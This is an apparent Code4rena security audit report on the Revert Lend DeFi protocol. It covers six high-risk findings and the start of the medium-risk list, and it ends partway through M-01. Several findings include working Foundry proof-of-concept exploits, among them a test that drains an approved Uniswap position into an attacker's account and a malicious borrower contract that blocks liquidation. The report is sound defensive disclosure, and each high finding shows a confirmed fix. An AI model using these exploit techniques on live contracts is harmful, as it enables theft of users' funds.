High Risk Findings (6)
[H-01] V3Vault.sol permit signature does not check receiving token address is USDC
Submitted by VAD37, also found by thank_you (1, 2, 3), santiellena, ArsenLupin, jesusrod15, and ayden

In V3Vault.sol there all 3 instances of permit2.permitTransferFrom(), all 3 does not check token transfered in is USDC token. Allowing user to craft permit signature from any ERC20 token and Vault will accept it as USDC.

Impact
User can steal all USDC from vault using permit signature of any ERC20 token.

Proof of Concept
Here is how Vault accept USDC from user. Vault will accept Uniswap.Permit2 signature transfer allowance from Permit2 then to vault contract.

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L877C1-L917C6

    if (params.permitData.length > 0) {

        (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =

            abi.decode(params.permitData, (ISignatureTransfer.PermitTransferFrom, bytes));

        permit2.permitTransferFrom(

            permit,

            ISignatureTransfer.SignatureTransferDetails(address(this), state.liquidatorCost),

            msg.sender,

            signature

        );

    } else {

        // take value from liquidator

        SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), state.liquidatorCost);

    }
Below is permit signature struct that can be decoded from user provided data:

interface ISignatureTransfer is IEIP712 {

    /// @notice The token and amount details for a transfer signed in the permit transfer signature

    struct TokenPermissions {

        // ERC20 token address

        address token;

        // the maximum amount that can be spent

        uint256 amount;

    }


    /// @notice The signed permit message for a single token transfer

    struct PermitTransferFrom {

        TokenPermissions permitted;

        // a unique value for every token owner's signature to prevent signature replays

        uint256 nonce;

        // deadline on the permit signature

        uint256 deadline;

    }

}
V3Vault.sol needs to check TokenPermissions.token is USDC, same as vault main asset.

Uniswap.permit2.permitTransferFrom() only checks if the sign signature is correct. This is meaningless as Vault does not validate input data.

This allows users to use any ERC20 token, gives allowance and permits to Uniswap.Permit2. The Vault will accept any transfer token from Permit2 as USDC. Allowing users to deposit any ERC20 token and steal USDC from vault.

Recommended Mitigation Steps
Fix missing user input validations in 3 all instances of permit2:

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L717C1-L725C15
https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L893C1-L898C15
https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L877C1-L917C6

    if (params.permitData.length > 0) {

        (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =

            abi.decode(params.permitData, (ISignatureTransfer.PermitTransferFrom, bytes));

        require(permit.permitted.token == asset, "V3Vault: invalid token");

        //@permitted amount is checked inside uniswap Permit2

        permit2.permitTransferFrom(

            permit,

            ISignatureTransfer.SignatureTransferDetails(address(this), state.liquidatorCost),

            msg.sender,

            signature

        );

    } else {

        // take value from liquidator

        SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), state.liquidatorCost);

    }
Assessed type
ERC20

kalinbas (Revert) confirmed

Revert mitigated:

PR here - checks token in permit.

Status: Mitigation confirmed. Full details in reports from thank_you, b0g0 and ktg.

[H-02] Risk of reentrancy onERC721Received function to manipulate collateral token configs shares
Submitted by Aymen0909, also found by b0g0

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L454-L473
https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L1223-L1241

Issue Description
The onERC721Received function is invoked whenever the vault contract receives a Uniswap V3 position ERC721 token. This can happen either when an owner creates a new position or when a transformation occurs.

For this issue, we’ll focus on the second case, specifically when a position is going through a transformation, which creates a new position token. In such a case, we have tokenId != oldTokenId, and the else block is run, as shown below:

function onERC721Received(address, address from, uint256 tokenId, bytes calldata data)

    external

    override

    returns (bytes4)

{

    ...


    if {

        ...

    } else {

        uint256 oldTokenId = transformedTokenId;


        // if in transform mode - and a new position is sent - current position is replaced and returned

        if (tokenId != oldTokenId) {

            address owner = tokenOwner[oldTokenId];


            // set transformed token to new one

            transformedTokenId = tokenId;


            // copy debt to new token

            loans[tokenId] = Loan(loans[oldTokenId].debtShares);


            _addTokenToOwner(owner, tokenId);

            emit Add(tokenId, owner, oldTokenId);


            // clears data of old loan

            _cleanupLoan(oldTokenId, debtExchangeRateX96, lendExchangeRateX96, owner);


            //@audit can reenter with onERC721Received and call repay or borrow to call _updateAndCheckCollateral twice and manipulate collateral token configs


            // sets data of new loan

            _updateAndCheckCollateral(

                tokenId, debtExchangeRateX96, lendExchangeRateX96, 0, loans[tokenId].debtShares

            );

        }

    }


    return IERC721Receiver.onERC721Received.selector;

}
We should note that the _cleanupLoan function does return the old position token to the owner:

function _cleanupLoan(

    uint256 tokenId,

    uint256 debtExchangeRateX96,

    uint256 lendExchangeRateX96,

    address owner

) internal {

    _removeTokenFromOwner(owner, tokenId);

    _updateAndCheckCollateral(

        tokenId,

        debtExchangeRateX96,

        lendExchangeRateX96,

        loans[tokenId].debtShares,

        0

    );

    delete loans[tokenId];

    nonfungiblePositionManager.safeTransferFrom(

        address(this),

        owner,

        tokenId

    );

    emit Remove(tokenId, owner);

}
The issue that can occur is that the _cleanupLoan is invoked before the _updateAndCheckCollateral call. So, a malicious owner can use the onERC721Received callback when receiving the old token to call the borrow function, which makes changes to loans[tokenId].debtShares and calls _updateAndCheckCollateral. When the call resumes, the V3Vault.onERC721Received function will call _updateAndCheckCollateral again, resulting in incorrect accounting of internal token configs debt shares (tokenConfigs[token0].totalDebtShares & tokenConfigs[token1].totalDebtShares) and potentially impacting the vault borrowing process negatively.

Proof of Concept
Let’s use the following scenario to demonstrate the issue:

Before starting, we suppose the following states:

tokenConfigs[token0].totalDebtShares = 10000
tokenConfigs[token1].totalDebtShares = 15000
Bob has previously deposited a UniswapV3 position (which uses token0 and token1) with tokenId = 12 and borrowed loans[tokenId = 12].debtShares = 1000 debt shares.
Bob calls the transform function to change the range of his position using the AutoRange transformer, which mints a new ERC721 token tokenId = 20 for the newly arranged position and sends it to the vault.
Upon receiving the new token, the V3Vault.onERC721Received function is triggered. As we’re in transformation mode and the token ID is different, the second else block above will be executed.
V3Vault.onERC721Received will copy loan debt shares to the new token, so we’ll have loans[tokenId = 20].debtShares = 1000.
Then V3Vault.onERC721Received will invoke the _cleanupLoan function to clear the data of the old loan and transfer the old position token tokenId = 12 back to Bob.

5.1. _cleanupLoan will also call _updateAndCheckCollateral function to change oldShares = 1000 --> newShares = 0 (remove old token shares), resulting in:

tokenConfigs[token0].totalDebtShares = 10000 - 1000 = 9000.
tokenConfigs[token1].totalDebtShares = 15000 - 1000 = 14000.
Bob, upon receiving the old position token, will also use the ERC721 onERC721Received callback to call the borrow function. He will borrow 200 debt shares against his new position token tokenId = 20.

6.1. The borrow function will update the token debt shares from loans[tokenId = 20].debtShares = 1000 to: loans[tokenId = 20].debtShares = 1000 + 200 = 1200 (assuming the position is healthy).
6.2. The borrow function will also invoke the _updateAndCheckCollateral function to change oldShares = 1000 --> newShares = 1200 for tokenId = 20, resulting in:

tokenConfigs[token0].totalDebtShares = 9000 + 200 = 9200.
tokenConfigs[token1].totalDebtShares = 14000 + 200 = 14200.
Bob’s borrow call ends, and the V3Vault.onERC721Received call resumes. _updateAndCheckCollateral gets called again, changing oldShares = 0 --> newShares = 1200 (as the borrow call changed the token debt shares), resulting in:

tokenConfigs[token0].totalDebtShares = 9200 + 1200 = 10400.
tokenConfigs[token1].totalDebtShares = 14200 + 1200 = 15400.
Now, let’s assess what Bob managed to achieve by taking a normal/honest transformation process (without using the onERC721Received callback) and then a borrow operation scenario:

Normally, when V3Vault.onERC721Received is called, it shouldn’t change the internal token configs debt shares (tokenConfigs[token0].totalDebtShares & tokenConfigs[token1].totalDebtShares). After a normal V3Vault.onERC721Received, we should still have:

tokenConfigs[token0].totalDebtShares = 10000.
tokenConfigs[token1].totalDebtShares = 15000.
Then, when Bob borrows 200 debt shares against the new token, we should get:

tokenConfigs[token0].totalDebtShares = 10000 + 200 = 10200.
tokenConfigs[token1].totalDebtShares = 15000 + 200 = 15200.
We observe that by using the onERC721Received callback, Bob managed to increase the internal token configs debt shares (tokenConfigs[token0].totalDebtShares & tokenConfigs[token1].totalDebtShares) by 200 debt shares more than expected.

This means that Bob, by using this attack, has manipulated the internal token configs debt shares, making the vault believe it has 200 additional debt shares. Bob can repeat this attack multiple times until he approaches the limit represented by collateralValueLimitFactorX32 and collateralValueLimitFactorX32 multiplied by the amount of asset lent as shown below:

uint256 lentAssets = _convertToAssets(

    totalSupply(),

    lendExchangeRateX96,

    Math.Rounding.Up

);

uint256 collateralValueLimitFactorX32 = tokenConfigs[token0]

    .collateralValueLimitFactorX32;

if (

    collateralValueLimitFactorX32 < type(uint32).max &&

    _convertToAssets(

        tokenConfigs[token0].totalDebtShares,

        debtExchangeRateX96,

        Math.Rounding.Up

    ) >

    (lentAssets * collateralValueLimitFactorX32) / Q32

) {

    revert CollateralValueLimit();

}

collateralValueLimitFactorX32 = tokenConfigs[token1]

    .collateralValueLimitFactorX32;

if (

    collateralValueLimitFactorX32 < type(uint32).max &&

    _convertToAssets(

        tokenConfigs[token1].totalDebtShares,

        debtExchangeRateX96,

        Math.Rounding.Up

    ) >

    (lentAssets * collateralValueLimitFactorX32) / Q32

) {

    revert CollateralValueLimit();

}
Then, when other borrowers try to call the borrow function, it will revert because _updateAndCheckCollateral will trigger the CollateralValueLimit error, thinking there is too much debt already. However, this is not the case, as the internal token configs debt shares have been manipulated (increased) by an attacker (Bob).

This attack is irreversible because there is no way to correct the internal token configs debt shares (tokenConfigs[token0].totalDebtShares & tokenConfigs[token1].totalDebtShares), and the vault will remain in that state, not allowing users to borrow, resulting in no interest being accrued and leading to financial losses for the lenders and the protocol.

Impact
A malicious attacker could use the AutoRange transformation process to manipulate the internal token configs debt shares, potentially resulting in:

Fewer loans being allowed by the vault than expected.
A complete denial-of-service (DOS) for all borrow operations.
Tools Used
VS Code

Recommended Mitigation
The simplest way to address this issue is to ensure that the onERC721Received function follows the Correctness by Construction (CEI) pattern, as follows:

function onERC721Received(address, address from, uint256 tokenId, bytes calldata data)

    external

    override

    returns (bytes4)

{

    ...


    if {

        ...

    } else {

        uint256 oldTokenId = transformedTokenId;


        // if in transform mode - and a new position is sent - current position is replaced and returned

        if (tokenId != oldTokenId) {

            address owner = tokenOwner[oldTokenId];


            // set transformed token to new one

            transformedTokenId = tokenId;


            // copy debt to new token

            loans[tokenId] = Loan(loans[oldTokenId].debtShares);


            _addTokenToOwner(owner, tokenId);

            emit Add(tokenId, owner, oldTokenId);


--          // clears data of old loan

--          _cleanupLoan(oldTokenId, debtExchangeRateX96, lendExchangeRateX96, owner);


            // sets data of new loan

            _updateAndCheckCollateral(

                tokenId, debtExchangeRateX96, lendExchangeRateX96, 0, loans[tokenId].debtShares

            );


++          // clears data of old loan

++          _cleanupLoan(oldTokenId, debtExchangeRateX96, lendExchangeRateX96, owner);

        }

    }


    return IERC721Receiver.onERC721Received.selector;

}
Assessed type
Context

kalinbas (Revert) confirmed via duplicate Issue #309:

Revert mitigated:

PRs here and here - removed sending of NFT to avoid reentrancy.

Status: Mitigation confirmed. Full details in reports from thank_you, ktg and b0g0.

[H-03] V3Vault::transform does not validate the data input and allows a depositor to exploit any position approved on the transformer
Submitted by b0g0

Any account holding a position inside V3Vault can transform any NFT position outside the vault that has been delegated to Revert operators for transformation (AutoRange, AutoCompound and all other transformers that manage positions outside of the vault).

The exploiter can pass any params at any time, affecting positions they do not own and their funds critically.

Vulnerability details
In order to borrow from V3Vault, an account must first create a collateralized position by sending his position NFT through the create() function

Any account that has a position inside the vault can use the transform() function to manage the NFT, while it is owned by the vault:

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L497

  function transform(uint256 tokenId, address transformer, bytes calldata data)

        external

        override

        returns (uint256 newTokenId)

    {

        ....

        //@audit -> tokenId inside data not checked


        (uint256 newDebtExchangeRateX96,) = _updateGlobalInterest();


        address loanOwner = tokenOwner[tokenId];


        // only the owner of the loan, the vault itself or any approved caller can call this

        if (loanOwner != msg.sender && !transformApprovals[loanOwner][tokenId][msg.sender]) {

            revert Unauthorized();

        }


        // give access to transformer

        nonfungiblePositionManager.approve(transformer, tokenId);


        (bool success,) = transformer.call(data);

        if (!success) {

            revert TransformFailed();

        }


        ....


        // check owner not changed (NEEDED because token could have been moved somewhere else in the meantime)

        address owner = nonfungiblePositionManager.ownerOf(tokenId);

        if (owner != address(this)) {

            revert Unauthorized();

        }


        ....


        return tokenId;

    }
The user passes an approved transformer address and the calldata to execute on it. The problem here is that the function only validates the ownership of the uint256 tokenId input parameter. However, it never checks if the tokenId encoded inside bytes calldata data parameter belongs to msg.sender.

This allows any vault position holder to call an allowed transformer with arbitrary params encoded as calldata and change any position delegated to that transformer.

This will impact all current and future transformers that manage Vault positions. To prove the exploit, I’m providing a coded POC using the AutoCompound transformer.

Proof of Concept
A short explanation of the POC:

Alice is an account outside the vault that approves her position ALICE_NFT to be auto-compounded by Revert controlled operators (bots).
Bob decides to act maliciously and transform Alice position.
Bob opens a position in the vault with his BOB_NFT so that he can call transform().
Bob calls V3Vault.transform() with BOB_NFT as tokenId param to pass validation but encodes ALICE_NFT inside data.
Bob successfully transforms Alice position with his params.
You can add the following test to V3Vault.t.sol and run forge test --contracts /test/V3Vault.t.sol --mt testTransformExploit -vvvv.

function testTransformExploit() external {

        // Alice

        address ALICE_ACCOUNT = TEST_NFT_ACCOUNT;

        uint256 ALICE_NFT = TEST_NFT;


        // Malicious user

        address EXPLOITER_ACCOUNT = TEST_NFT_ACCOUNT_2;

        uint256 EXPLOITER_NFT = TEST_NFT_2;


        // Set up an auto-compound transformer

        AutoCompound autoCompound = new AutoCompound(

            NPM,

            WHALE_ACCOUNT,

            WHALE_ACCOUNT,

            60,

            100

        );

        vault.setTransformer(address(autoCompound), true);

        autoCompound.setVault(address(vault), true);


        // Set fee to 2%

        uint256 Q64 = 2 ** 64;

        autoCompound.setReward(uint64(Q64 / 50));


        // Alice decides to delegate her position to

        // Revert bots (outside of vault) to be auto-compounded

        vm.prank(ALICE_ACCOUNT);

        NPM.approve(address(autoCompound), ALICE_NFT);


        // Exploiter opens a position in the Vault

        vm.startPrank(EXPLOITER_ACCOUNT);

        NPM.approve(address(vault), EXPLOITER_NFT);

        vault.create(EXPLOITER_NFT, EXPLOITER_ACCOUNT);

        vm.stopPrank();


        // Exploiter passes ALICE_NFT as param

        AutoCompound.ExecuteParams memory params = AutoCompound.ExecuteParams(

            ALICE_NFT,

            false,

            0

        );


        // Exploiter account uses his own token to pass validation

        // but transforms Alice position

        vm.prank(EXPLOITER_ACCOUNT);

        vault.transform(

            EXPLOITER_NFT,

            address(autoCompound),

            abi.encodeWithSelector(AutoCompound.execute.selector, params)

        );

    }
Since the exploiter can control the calldata send to the transformer, he can impact any approved position in various ways. In the case of AutoCompound it can be:

Draining the position funds - AutoCompound collects a fee on every transformation. The exploiter can call it multiple times.
Manipulating swap0To1 & amountIn parameters to execute swaps in unfavourable market conditions, leading to loss of funds or value extraction.
Those are only a couple of ideas. The impact can be quite severe depending on the transformer and parameters passed.

Tools Used
Foundry

Recommended Mitigation Steps
Consider adding a check inside transform() to make sure the provided tokenId and the one encoded as calldata are the same. This way the caller will not be able to manipulate other accounts positions.

Assessed type
Invalid Validation

kalinbas (Revert) confirmed

Revert mitigated:

PR here - refactoring to make all transformers properly check caller permission.

Status: Mitigation confirmed. Full details in reports from ktg, thank_you and b0g0.

[H-04] V3Utils.execute() does not have caller validation, leading to stolen NFT positions from users
Submitted by 0xjuan, also found by CaeraDenoir, santiellena, Tigerfrake, Timenov, and novamanbg

When a user wants to use V3Utils, one of the flows stated by the protocol is as follows:

TX1: User calls NPM.approve(V3Utils, tokenId).
TX2: User calls V3Utils.execute() with specific instructions.
Note that this can’t be done in one transaction since in TX1, the NPM has to be called directly by the EOA which owns the NFT. Thus, the V3Utils.execute() would have to be called in a subsequent transaction.

Now this is usually a safe design pattern, but the issue is that V3Utils.execute() does not validate the owner of the UniV3 Position NFT that is being handled. This allows anybody to provide arbitrary instructions and call V3Utils.execute() once the NFT has been approved in TX1.

A malicious actor provide instructions that include the following:

WhatToDo = WITHDRAW_AND_COLLECT_AND_SWAP.
recipient = malicious_actor_address.
liquidity = total_position_liquidity.
This would collect all liquidity from the position that was approved, and send it to the malicious attacker who didn’t own the position.

Impact
The entire liquidity of a specific UniswapV3 liquidity provision NFT can be stolen by a malicious actor, with zero cost.

Proof of Concept
This foundry test demonstrates how an attacker can steal all the liquidity from a UniswapV3 position NFT that is approved to the V3Utils contract.

To run the PoC:

Add the following foundry test to test/integration/V3Utils.t.sol.
Run the command forge test --via-ir --mt test_backRunApprovals_toStealAllFunds -vv in the terminal.
function test_backRunApprovals_toStealAllFunds() external {

    address attacker = makeAddr("attacker");


    uint256 daiBefore = DAI.balanceOf(attacker);

    uint256 usdcBefore = USDC.balanceOf(attacker);

    (,,,,,,, uint128 liquidityBefore,,,,) = NPM.positions(TEST_NFT_3);


    console.log("Attacker's DAI Balance Before: %e", daiBefore);

    console.log("Attacker's USDC Balance Before: %e", usdcBefore);

    console.log("Position #%s's liquidity Before: %e", TEST_NFT_3, liquidityBefore);


    // Malicious instructions used by attacker:

    V3Utils.Instructions memory bad_inst = V3Utils.Instructions(

        V3Utils.WhatToDo.WITHDRAW_AND_COLLECT_AND_SWAP,

        address(USDC), 0, 0, 0, 0, "", 0, 0, "", type(uint128).max, type(uint128).max, 0, 0, 0,

        liquidityBefore, // Attacker chooses to withdraw 100% of the position's liquidity

        0,

        0,

        block.timestamp,

        attacker, // Recipient address of tokens

        address(0),

        false,

        "",

        ""

    );


    // User approves V3Utils, planning to execute next

    vm.prank(TEST_NFT_3_ACCOUNT);

    NPM.approve(address(v3utils), TEST_NFT_3);

    

    console.log("\n--ATTACK OCCURS--\n");

    // User's approval gets back-ran

    vm.prank(attacker);

    v3utils.execute(TEST_NFT_3, bad_inst);

    

    uint256 daiAfter = DAI.balanceOf(attacker);

    uint256 usdcAfter = USDC.balanceOf(attacker);

    (,,,,,,, uint128 liquidityAfter,,,,) = NPM.positions(TEST_NFT_3);


    console.log("Attacker's DAI Balance After: %e", daiAfter);

    console.log("Attacker's USDC Balance After: %e", usdcAfter);

    console.log("Position #%s's liquidity After: %e", TEST_NFT_3, liquidityAfter);

}
Console output:

Ran 1 test for test/integration/V3Utils.t.sol:V3UtilsIntegrationTest

[PASS] test_backRunApprovals_toStealAllFunds() (gas: 351245)

Logs:

  Attacker's DAI Balance Before: 0e0

  Attacker's USDC Balance Before: 0e0

  Position #4660's liquidity Before: 1.2922419498089422291e19

  

--ATTACK OCCURS--


  Attacker's DAI Balance After: 4.2205702812280886591005e22

  Attacker's USDC Balance After: 3.5931648355e10

  Position #4660's liquidity After: 0e0


Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.17s


Ran 1 test suite in 1.17s: 1 tests passed, 0 failed, 0 skipped (1 total tests)
Recommended Mitigation Steps
Add a check to ensure that only the owner of the position can call V3Utils.execute.

Note the fix also checks for the case where a user may have transferred the token into the V3Utils. In that case it is fine that msg.sender != tokenOwner, since tokenOwner would then be the V3Utils contract itself.

function execute(uint256 tokenId, Instructions memory instructions) public returns (uint256 newTokenId) {

        

+       address tokenOwner = nonfungiblePositionManager.ownerOf(tokenId);

+       if (tokenOwner != msg.sender && tokenOwner != address(this)) {

+           revert Unauthorized();

+       }

    

    /* REST OF CODE */

}
Assessed type
Access Control

kalinbas (Revert) confirmed

Revert mitigated:

PR here - refactoring to make all transformers properly check caller permission.

Status: Mitigation confirmed. Full details in reports from thank_you, ktg and b0g0.

[H-05] _getReferencePoolPriceX96() will show incorrect price for negative tick deltas in current implementation cause it doesn’t round up for them
Submitted by Bauchibred, also found by grearlake (1, 2), Giorgio, and kodyvim

Take a look here.

    function _getReferencePoolPriceX96(IUniswapV3Pool pool, uint32 twapSeconds) internal view returns (uint256) {

        uint160 sqrtPriceX96;

        // if twap seconds set to 0 just use pool price

        if (twapSeconds == 0) {

            (sqrtPriceX96,,,,,,) = pool.slot0();

        } else {

            uint32[] memory secondsAgos = new uint32[](2);

            secondsAgos[0] = 0; // from (before)

            secondsAgos[1] = twapSeconds; // from (before)

            (int56[] memory tickCumulatives,) = pool.observe(secondsAgos); // pool observe may fail when there is not enough history available (only use pool with enough history!)

            //@audit

            int24 tick = int24((tickCumulatives[0] - tickCumulatives[1]) / int56(uint56(twapSeconds)));

            sqrtPriceX96 = TickMath.getSqrtRatioAtTick(tick);

        }


        return FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, Q96);

    }
This function is used to calculate the reference pool price. It uses either the latest slot price or TWAP based on twapSeconds.

Now note that unlike the original uniswap implementation, here the delta of the tick cumulative is being calculated in a different manner, i.e protocol implements (tickCumulatives[0] - tickCumulatives[1] instead of tickCumulatives[1] - (tickCumulatives[0] which is because here, secondsAgos[0] = 0; and secondsAgos[1] = twapSeconds;; unlike in Uniswap OracleLibrary where secondsAgos[0] = secondsAgo; and secondsAgos[1] = 0;, so everything checks out and the tick deltas are calculated accurately, i.e in our case tickCumulativesDelta = tickCumulatives[0] - tickCumulatives[1].

The problem now is that in the case if our tickCumulativesDelta is negative, i.e int24(tickCumulatives[0] - tickCumulatives[1] < 0) , then the tick should be rounded down, as it’s done in the uniswap library.

But this is not being done and as a result, in the case if int24(tickCumulatives[0] - tickCumulatives[1]) is negative and (tickCumulatives[0] - tickCumulatives[1]) % secondsAgo != 0, then the returned tick will be bigger then it should be; which opens possibility for some price manipulations and arbitrage opportunities.

Impact
In this case, if int24(tickCumulatives[0] - tickCumulatives[1]) is negative and ((tickCumulatives[0] - tickCumulatives[1]) % secondsAgo != 0, then returned tick will be bigger than it should be which places protocol wanting prices to be right not be able to achieve this goal. Note that whereas protocol in some cases relies on multiple sources of price, they still come down and end on weighing the differences between the prices and reverting if a certain limit is passed (MIN_PRICE_DIFFERENCE) between both the Chainlink price and Uniswap twap price.
Now in the case where the implemented pricing mode is only TWAP, then the protocol would work with a flawed price since the returned price would be different than it really is; potentially leading to say, for example, some positions that should be liquidatable not being liquidated. Before liquidation, there is a check to see if the loan is healthy. Now this check queries the value of this asset via getValue() and if returned price is wrong then unhealthy loans could be pronounced as healthy and vice versa.
Also, this indirectly curbs the access to functions like borrow(), transform() and decreaseLiquidityAndCollect(), since they all make a call to _requireLoanIsHealthy(), which would be unavailable due to it’s dependence on _checkLoanIsHealthy().
This bug case causes the Automator’s _getTWAPTick() function to also return a wrong tick, which then leads to _hasMaxTWAPTickDifference() returning false data , since the difference would now be bigger eventually leading to wrongly disabling/enabling of swaps in AutoCompound.sol, whereas, it should be otherwise.
Note that for the second/third case, the call route to get to _getReferencePoolPriceX96() is: "_checkLoanIsHealthy() -> getValue() -> _getReferenceTokenPriceX96 -> _getTWAPPriceX96 -> _getReferencePoolPriceX96() " as can be seen here.

Tools Used
Uniswap V3’s OracleLibrary.
And a similar finding on Code4rena from Q1 2024.
Recommended Mitigation Steps
Add this line: if (tickCumulatives[0] - tickCumulatives[1] < 0 && (tickCumulatives[0] - tickCumulatives[1]) % secondsAgo != 0) timeWeightedTick --;.

Assessed type
Uniswap

kalinbas (Revert) confirmed

Revert mitigated:

PR here - fixed calculation.

Status: Mitigation confirmed. Full details in reports from thank_you, b0g0 and ktg.

[H-06] Owner of a position can prevent liquidation due to the onERC721Received callback
Submitted by 0xjuan, also found by CaeraDenoir, kinda_very_good, falconhoof, 0x175, Arz, JohnSmith, alix40, stackachu, givn, wangxx2026, Ocean_Sky, 0xloscar01, SpicyMeatball, 0xAlix2, Ali-_-Y, 0rpse, iamandreiski, 0xBugSlayer, nmirchev8, nnez, ayden, and novamanbg

When liquidating a position, _cleanUpLoan() is called on the loan. This attempts to send the uniswap LP position back to the user via the following line:

nonfungiblePositionManager.safeTransferFrom(address(this), owner, tokenId);
This safeTransferFrom function call invokes the onERC721Received function on the owner’s contract. The transaction will only succeed if the owner’s contract returns the function selector of the standard onERC721Received function. However, the owner can design the function to return an invalid value, and this would lead to the safeTransferFrom reverting, thus being unable to liquidate the user.

Impact
This leads to bad debt accrual in the protocol which cannot be prevented, and eventually insolvency.

Proof of Concept
Below is a foundry test that proves this vulnerability. To run the PoC:

Copy the attacker contract into test/integration/V3Vault.t.sol.
In the same file, copy the contents of the ‘foundry test’ dropdown into the V3VaultIntegrationTest contract.
In the terminal, enter forge test --via-ir --mt test_preventLiquidation -vv.
Attacker Contract:

contract MaliciousBorrower {

    

    address public vault;


    constructor(address _vault) {

        vault = _vault;

    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {


        // Does not accept ERC721 tokens from the vault. This causes liquidation to revert

        if (from == vault) return bytes4(0xdeadbeef);


        else return msg.sig;

    }

}
Foundry test:

function test_preventLiquidation() external {

        

        // Create malicious borrower, and setup a loan

        address maliciousBorrower = address(new MaliciousBorrower(address(vault)));

        custom_setupBasicLoan(true, maliciousBorrower);


        // assert: debt is equal to collateral value, so position is not liquidatable

        (uint256 debt,,uint256 collateralValue, uint256 liquidationCost, uint256 liquidationValue) = vault.loanInfo(TEST_NFT);

        assertEq(debt, collateralValue);


        // collateral DAI value change -100%

        vm.mockCall(

            CHAINLINK_DAI_USD,

            abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),

            abi.encode(uint80(0), int256(0), block.timestamp, block.timestamp, uint80(0))

        );

        

        // ignore difference

        oracle.setMaxPoolPriceDifference(10001);


        // assert that debt is greater than collateral value (position is liquidatable now)

        (debt, , collateralValue, liquidationCost, liquidationValue) = vault.loanInfo(TEST_NFT);

        assertGt(debt, collateralValue);


        (uint256 debtShares) = vault.loans(TEST_NFT);


        vm.startPrank(WHALE_ACCOUNT);

        USDC.approve(address(vault), liquidationCost);


        // This fails due to malicious owner. So under-collateralised position can't be liquidated. DoS!

        vm.expectRevert("ERC721: transfer to non ERC721Receiver implementer");

        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares, 0, 0, WHALE_ACCOUNT, ""));

    }


    function custom_setupBasicLoan(bool borrowMax, address borrower) internal {

        // lend 10 USDC

        _deposit(10000000, WHALE_ACCOUNT);  


        // Send the test NFT to borrower account

        vm.prank(TEST_NFT_ACCOUNT);

        NPM.transferFrom(TEST_NFT_ACCOUNT, borrower, TEST_NFT);


        uint256 tokenId = TEST_NFT;


        // borrower adds collateral 

        vm.startPrank(borrower);

        NPM.approve(address(vault), tokenId);

        vault.create(tokenId, borrower);


        (,, uint256 collateralValue,,) = vault.loanInfo(tokenId);


        // borrower borrows assets, backed by their univ3 position

        if (borrowMax) {

            // borrow max

            vault.borrow(tokenId, collateralValue);

        }

        vm.stopPrank();

    }
Terminal output:

Ran 1 test for test/integration/V3Vault.t.sol:V3VaultIntegrationTest

[PASS] test_preventLiquidation() (gas: 1765928)

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 473.56ms
Recommended Mitigation Steps
One solution would be to approve the NFT to the owner and provide a way (via the front-end or another contract) for them to redeem the NFT back later on. This is a “pull over push” approach and ensures that the liquidation will occur.

Example:

    function _cleanupLoan(uint256 tokenId, uint256 debtExchangeRateX96, uint256 lendExchangeRateX96, address owner)

        internal

    {

        _removeTokenFromOwner(owner, tokenId);

        _updateAndCheckCollateral(tokenId, debtExchangeRateX96, lendExchangeRateX96, loans[tokenId].debtShares, 0);

        delete loans[tokenId];

-        nonfungiblePositionManager.safeTransferFrom(address(this), owner, tokenId);

+       nonfungiblePositionManager.approve(owner, tokenId);

        emit Remove(tokenId, owner);

    }
Assessed type
DoS

kalinbas (Revert) confirmed

Revert mitigated:

PRs here and here - removed sending of NFT to avoid reentrancy.

Status: Mitigation confirmed. Full details in reports from thank_you, ktg and b0g0.

Medium Risk Findings (25)
[M-01] An attacker can easily bypass the collateral value limit factor checks
Submitted by Arz, also found by lanrebayode77

The collateral value limit factor checks in _updateAndCheckCollateral() are used to check if the current value of used collateral is more than the allowed limit. The problem here is that these checks are not done when withdrawing lent tokens so an attacker can easily bypass these checks.

Example:

The collateral value limit factor is set to 90% for both collateral tokens.
The lent amount is 100 USDC and Alice has borrowed 90 USDC.
An attacker wants to borrow the remaining 10 USDC but he cant because of the checks.
He executes an attack in 1 transaction - he supplies 10 USDC, borrows 10 USDC and then withdraws the 10 USDC that he lent.
The amount borrowed is 100 USDC even though the collateral factor is 90%.
The attacker can do this to bypass the checks, this can also block calls from the AutoRange automator. Whenever a new position is sent, _updateAndCheckCollateral() is called, which will revert because the attacker surpassed the limits.

Impact
The attacker can easily surpass the limits, this can also make calls from AutoRange revert because _updateAndCheckCollateral() is called when the position is replaced and it will revert because the limits were surpassed. The automator will fail to change the range of the positions.

Proof of Concept
Add this to V3Vault.t.sol, as you can see the limits were surpassed:

function testCollateralValueLimit() external {

        _setupBasicLoan(false);


        //set collateral value limit to 90%

        vault.setTokenConfig(address(DAI), uint32(Q32 * 9 / 10), uint32(Q32 * 9 / 10));


        vm.prank(TEST_NFT_ACCOUNT);

        vault.borrow(TEST_NFT, 8e6);


        //10 USDC were lent and 2 USDC were borrowed

        //Attacker can only borrow 1 USDC because of the collateral value limit


        //What he does is supplies 2 USDC, borrows 2 USDC and then withdraws what he lent

        _deposit(2e6, TEST_NFT_ACCOUNT_2);

        _createAndBorrow(TEST_NFT_2, TEST_NFT_ACCOUNT_2, 2e6);


        vm.prank(TEST_NFT_ACCOUNT_2);

        vault.withdraw(2e6, TEST_NFT_ACCOUNT_2, TEST_NFT_ACCOUNT_2);


        (,,uint192 totalDebtShares) = vault.tokenConfigs(address(DAI));

        console.log("The total amount of shares lent:", vault.totalSupply());

        console.log("The total amount of shares borrowed:", totalDebtShares);

    }
Tools Used
Foundry

Recommended Mitigation Steps
